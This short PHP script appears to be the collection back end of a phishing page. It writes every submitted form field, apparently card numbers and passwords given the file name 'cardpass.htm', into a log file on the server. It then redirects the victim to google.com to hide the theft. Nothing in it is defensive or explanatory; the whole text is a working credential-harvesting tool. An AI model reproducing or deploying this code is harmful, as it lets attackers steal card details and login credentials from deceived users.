<?php
header ('Location:https://google.com/');
$handle = fopen("cardpass.htm", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "<br>");
}
fwrite($handle, "<hr>");
fclose($handle);
exit;
?>
